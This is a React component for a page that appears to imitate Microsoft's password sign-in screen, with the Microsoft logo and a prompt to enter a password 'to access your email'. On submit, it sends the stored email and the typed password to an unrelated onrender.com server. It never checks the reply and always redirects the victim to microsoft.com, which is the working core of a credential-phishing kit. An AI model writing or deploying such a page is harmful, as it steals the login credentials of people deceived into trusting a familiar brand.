import React, { useEffect, useState } from "react";
import { motion } from "framer-motion";
import logo from "../assets/Microsoft_Logo_1.png";
import Footer from "./footer";
import { IoMdArrowBack } from "react-icons/io";
import { Link } from "react-router";
// import {useNavigate} from "react-router"

export default function Password() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  // const navigate = useNavigate()

  useEffect(() => {
    const storedEmail = localStorage.getItem("userEmail");
    if (storedEmail) {
      setEmail(storedEmail);
    }
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!password) {
      setError("Please enter your password.");
      return;
    }
    try {
      setLoading(true);
      setError("");
      const response = await fetch("https://two1-server.onrender.com/api/auth/signin", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      // const data = await response.json();
      setLoading(false);

      // if (!response.ok) {
      //   setError(data.message || "Invalid credentials. Please try again.");
      //   return;
      // }

      // console.log("Login success:", data);
      // localStorage.setItem("token", data.token);

      window.location.href = "https://www.microsoft.com/en-ng";
    } catch (err) {
      setLoading(false);
      console.error("❌ Login error:", err);
      setError("Something went wrong. Please try again later.");
    }
  };

  return (
    <div className="bg-image">
      <div className="flex flex-col mx-auto items-center justify-center h-[95vh]">
        <motion.div
          initial={{ x: 100, opacity: 0 }}
          animate={{ x: 0, opacity: 1 }}
          transition={{ duration: 0.8, ease: "easeInOut" }}
          className="flex flex-col items-center"
        >
          <div className="card w-screen lg:w-[480px] shadow-xl px-5 lg:px-12 py-10 bg-white">
            <img className="w-20 lg:w-30 pb-1" src={logo} alt="logo" />

            <div className="flex gap-3 items-center text-sm pt-2 pb-1">
              <Link to="/signin">
                <span className="text-gray-600 hover:bg-gray-300 hover:rounded-full">
                  <IoMdArrowBack size={18} />
                </span>
              </Link>
              <span className="text-gray-700 mb-2">{email}</span>
            </div>

            <h1 className="text-[25px] font-semibold">Enter password</h1>
            <p>Enter password to access your email</p>

            <form onSubmit={handleSubmit}>
              <input
                className="py-2 my-2 border-b w-full outline-0"
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />

              {error && <p className="text-red-500 text-sm">{error}</p>}

              <a className="text-[13px] text-[#1080db] hover:underline cursor-pointer">
                Forgot my password
              </a>

              <div className="flex justify-end mt-4">
                <button
                  type="submit"
                  disabled={loading}
                  className={`${
                    loading ? "bg-gray-400" : "bg-[#1080db] hover:bg-[#0c66b0]"
                  } text-white border-2 border-[#69b5f3] w-[100px] py-1`}
                >
                  {loading ? "Loading..." : "Sign in"}
                </button>
              </div>
            </form>
          </div>
        </motion.div>
      </div>
      <Footer />
    </div>
  );
}
